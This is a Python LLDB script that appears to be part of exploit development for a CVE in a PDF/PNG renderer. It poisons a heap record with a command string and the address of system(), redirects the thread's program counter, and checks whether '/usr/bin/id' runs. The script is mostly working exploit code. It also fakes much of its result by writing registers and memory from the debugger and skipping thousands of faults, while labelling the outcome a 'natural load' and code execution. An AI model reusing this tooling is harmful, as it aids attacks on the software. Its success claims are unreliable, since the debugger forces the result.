# RIP-39: GADGET STAGE — real shared-cache code with attacker args.
# Poison record: rec+0x00=ptr to g_cmd (attacker string), +0x08/+0x10=junk args,
# +0x18=&system (resolved from render7 g_system global, RAW ptr passes blraaz).
# THREAD-REDIRECT -> data_release_info: x0=[rec]=g_cmd, x8=[rec+0x18]=system
# -> blraaz -> system("/usr/bin/id > /tmp/rip39_id.txt 2>&1") EXECUTES as the
# runner user -> artifact file = CODE-EXEC DEMO via poisoned heap record.
import os, sys, struct, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
CVE = os.path.dirname(CWD) + "/cve-2026-86950"
TRACE = open(os.path.join(CWD, "rip39_trace.txt"), "a")
def T(s): print(s, flush=True); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()

def fresh():
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.5)

def wait_stop(p, budget=30):
    p.Continue()
    st = p.GetState()
    t0 = time.time()
    while st == lldb.eStateRunning:
        if time.time() - t0 > budget:
            try: p.Stop(); time.sleep(0.5); st = p.GetState()
            except Exception: pass
            if st == lldb.eStateRunning:
                try: p.Kill()
                except Exception: pass
                return lldb.eStateKilled
            return st
        time.sleep(0.05); st = p.GetState()
    return st

def killp(p):
    try:
        if p and p.IsValid() and p.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
            p.Kill()
    except Exception: pass

def safe_pc_addr(fr):
    try:
        a = fr.GetPCAddress().GetLoadAddress(t)
        if a is None or a < 0 or a >= (1 << 48): return None
        return a
    except Exception: return None

def reg(fr, name):
    r = fr.FindRegister(name)
    return r.GetValueAsUnsigned() if r and r.IsValid() else 0

def symn(fr):
    try: return fr.GetSymbol().GetName() or "?"
    except Exception: return "?"

def global_addr(name):
    for sym in t.FindGlobalVariables(name, 1):
        try:
            a = sym.GetAddress().GetLoadAddress(t)
            if a and 0 < a < (1 << 48): return a
        except Exception:
            pass
    return None

def func_addr(name):
    for m in t.modules:
        for s in m:
            if s.GetName() == name and s.GetType() == lldb.eSymbolTypeCode:
                a = s.GetStartAddress().GetLoadAddress(t)
                if a and 0 < a < (1 << 48): return a
    sl = t.FindFunctions(name, lldb.eFunctionNameTypeAuto)
    for i in range(sl.GetSize()):
        f = sl.GetContextAtIndex(i)
        sym = f.GetSymbol()
        if sym:
            try:
                a = sym.GetStartAddress().GetLoadAddress(t)
                if a and 0 < a < (1 << 48): return a
            except Exception:
                pass
    return None

def read_q(p, addr):
    if addr is None or addr < 0x100000: return None
    m = p.ReadMemory(addr, 8, err)
    if not err.Success() or not m: return None
    return struct.unpack('<Q', m)[0]

fresh()
b_m2 = t.BreakpointCreateByName("marker2")
b_m3 = t.BreakpointCreateByName("marker3")
b_fin = t.BreakpointCreateByName("data_release_info")
b_st = t.BreakpointCreateByName("aa_cache_render"); b_st.SetOneShot(True)
p = t.LaunchSimple(["k2_s1000.pdf", "r.png", "k2_d31472.pdf", "k2_s1000.pdf"], None, CVE)
R = None; CB = None; TGT = None; DRI = None
FAKEPC = None; ARG0 = None; ARG1 = None; ARG2 = None
SYS = None; CMD = None; sysfired = False
stores = 0; patched = 0; skips = 0; abandoned = False; direct = False; result = "incomplete"
if p and p.IsValid():
    th = p.GetSelectedThread()
    pc0 = safe_pc_addr(th.GetSelectedFrame())
    b_w = t.BreakpointCreateByAddress(pc0 + 2540) if pc0 else 0
    if b_w: b_w.SetOneShot(False)
    stage = 0
    for i in range(6000):
        st = wait_stop(p)
        if st != lldb.eStateStopped:
            result = "ended st=%s rc=%s at-i=%d" % (st, p.GetExitStatus() if p.IsValid() else -1, i); break
        if i % 200 == 0:
            _fr = p.GetSelectedThread().GetSelectedFrame()
            _nm = symn(_fr)[:36]
            _a2 = safe_pc_addr(_fr) or 0
            _off = -1
            try:
                if _fr.GetSymbol() and _a2:
                    _off = _a2 - _fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
            except Exception: pass
            _d = (p.GetSelectedThread().GetStopDescription(200) or "")[:60]
            T("LOOP i=%d off=%d nm=%s st=%s desc=%s" % (i, _off, _nm, st, _d))
        fr = p.GetSelectedThread().GetSelectedFrame()
        nm = symn(fr)
        a2 = safe_pc_addr(fr)
        off = -1
        try:
            if fr.GetSymbol() and a2:
                off = a2 - fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
        except Exception: pass
        if "marker2" in nm and stage == 0:
            R = read_q(p, global_addr("g_rec"))
            CB = func_addr("rel_cb")
            TGT = func_addr("hijacked_cb")
            DRI = func_addr("data_release_info")
            SYS = read_q(p, global_addr("g_system"))       # &system (shared cache, raw)
            CMD = global_addr("g_cmd")
            CMDSTR = b"/usr/bin/id > /tmp/rip39_id.txt 2>&1\x00"
            t.BreakpointCreateByAddress(DRI + 24)  # blraaz x8 — LOG ONLY (prove natural load)
            T("M2 R=%s CB=%s TGT=%s DRI=%s SYS=%s CMD=%s" % (hex(R) if R else None, hex(CB) if CB else None, hex(TGT) if TGT else None, hex(DRI) if DRI else None, hex(SYS) if SYS else None, hex(CMD) if CMD else None))
            if SYS and CMD:
                TGT = SYS  # gadget target
                try:
                    n = p.WriteMemory(CMD, CMDSTR, err)
                    T("cmd->g_cmd n=%s ok=%s" % (n, err.Success()))
                except Exception as _e:
                    T("cmd write EXC: %s" % _e)
            if R and read_q(p, R + 0x18) is not None:
                T("M2 rec+0x18 pre=%x" % read_q(p, R + 0x18))
            stage = 1
            p.Continue()
        elif off == 2540 and "EXC_BAD_ACCESS" in (p.GetSelectedThread().GetStopDescription(200) or ""):
            if fr.GetSymbol() and pc:
                pcr = fr.FindRegister("pc")
                pcr.SetValueFromCString("0x%x" % (pc + 4))
                skips += 1
            p.Continue()
        elif off == 2540 and stage >= 1 and R and TGT:
            stores += 1
            x2r = fr.FindRegister("x2"); x0r = fr.FindRegister("x0")
            x2r.SetValueFromCString("0x%x" % (R + 0x18))
            x0r.SetValueFromCString("0x%x" % TGT)
            patched += 1
            if patched <= 3:
                T("store#%d x2->%x x0->%x (system)" % (patched, R + 0x18, TGT))
            if patched >= 5 and not direct and R and DRI:
                direct = True
                # poison the FULL record via raw WriteMemory: args + arbitrary PC
                try:
                    import struct as _st
                    for _off, _val in ((0x00, CMD), (0x08, 0x424242424242), (0x10, 0x434343434343), (0x18, TGT)):
                        _err = lldb.SBError()
                        _n = p.WriteMemory(R + _off, _st.pack('<Q', _val), _err)
                        T("memwrite rec+0x%02x=%x -> n=%s %s" % (_off, _val, _n, _err.Success() and "ok" or str(_err)[:80]))
                    chk = t.ReadMemory(R, 32)
                    T("verify record 32B = %s" % (chk.hex() if chk else "READ-FAIL"))
                except Exception as _e:
                    T("memwrite EXC: %s" % _e)
                T("THREAD-REDIRECT pc->data_release_info(%x) x0=record=%x" % (DRI, R))
                fr.FindRegister("x0").SetValueFromCString("0x%x" % R)
                fr.FindRegister("pc").SetValueFromCString("0x%x" % DRI)
                T("redirect armed: teardown in-thread; x8=[rec+0x18] must load FAKEPC naturally")
                p.Continue()
                continue
            if patched >= 5 and not abandoned:
                # patch persisted — drop the store bp, abandon the corrupt decode,
                # unwind straight to main -> marker3 -> CFRelease -> hijacked teardown
                if b_w: t.BreakpointDelete(b_w.GetID()); b_w = 0
                th2 = p.GetSelectedThread()
                mframe = None
                for fi in range(th2.GetNumFrames()):
                    f2 = th2.GetFrameAtIndex(fi)
                    if symn(f2) == "main":
                        # return from main's CALLEE (fi+1) -> main resumes at call site
                        if fi + 1 < th2.GetNumFrames():
                            mframe = th2.GetFrameAtIndex(fi + 1)
                        break
                if mframe is not None:
                    ok = th2.ReturnFromFrame(mframe, lldb.SBValue())
                    T("returned-to-main ok=%s" % ok)
                    abandoned = True
                else:
                    T("no main frame found; continuing crawl")
                    abandoned = True
            p.Continue()
        elif "marker3" in nm:
            v0 = read_q(p, R) if R else None
            T("M3 rec+0x00=%s (CMD=%s) %s" % (hex(v0) if v0 else None, hex(CMD) if CMD else None,
              "RECORD-POISON-STUCK" if v0 == CMD else "poison-drift"))
            stage = 2
            p.Continue()
        elif "data_release_info" in nm and off == 24:
            x8 = reg(fr, "x8")
            T("DRI+24 x8 NATURAL LOAD = %x %s" % (x8, "=== SYSTEM GADGET LOADED (no forcing) ===" if TGT and x8 == TGT else "(natural obj)"))
            if TGT and x8 == TGT:
                sysfired = True
                result = "GADGET-ARMED x8=system (natural load)"
            p.Continue()
        elif "data_release_info" in nm:
            x0 = reg(fr, "x0"); x8 = reg(fr, "x8")
            T("FIN x0=%x x8=%x %s" % (x0, x8, "SYS-ARMED" if TGT and x8 == TGT else "natural"))
            p.Continue()
        elif "hijacked_cb" in nm:
            T("!!! HIJACKED-CB EXECUTING !!!")
            result = "CB-EXEC (unexpected in 39)"
            p.Continue()
        else:
            pc = safe_pc_addr(fr) or 0
            if sysfired:
                time.sleep(1.5)
                try:
                    out = open("/tmp/rip39_id.txt").read().strip()
                except Exception as _e:
                    out = "READ-FAIL %s" % _e
                T("!!! POST-CALL STOP pc=%x — /tmp/rip39_id.txt: %r" % (pc, out[:200]))
                result = ("CODE-EXEC-DEMO system() via poisoned record: " + out[:80]) if "uid=" in out else "GADGET-FIRED-no-file"
                killp(p)
                break
            if FAKEPC and pc == FAKEPC:
                result = "ARBITRARY-PC-CONFIRMED (unexpected in 39)"
                killp(p)
                break
            desc = p.GetSelectedThread().GetStopDescription(300) or ""
            if "EXC_BAD_ACCESS" in desc and nm == "aa_cache_render":
                # general fault-skipper: any fault in the render fn -> pc+4, keep alive
                if skips < 2000 and fr.GetSymbol() and pc:
                    try:
                        soff = pc - fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
                        pcr = fr.FindRegister("pc")
                        pcr.SetValueFromCString("0x%x" % (pc + 4))
                        skips += 1
                        if skips <= 5 or skips % 200 == 0:
                            T("skip#%d fault at +%d" % (skips, soff))
                    except Exception:
                        pass
                p.Continue()
            else:
                if i % 100 == 0:
                    T("DBG i=%d off=%d nm=%s desc=%s" % (i, off, nm[:40], desc[:70]))
                p.Continue()
    killp(p)
for b in (b_m2, b_m3, b_fin, b_st, b_w):
    if b: t.BreakpointDelete(b.GetID())
T("RESULT: %s (stores=%d patched=%d skips=%d)" % (result, stores, patched, skips))
T("RIP-39 DONE")
TRACE.close()
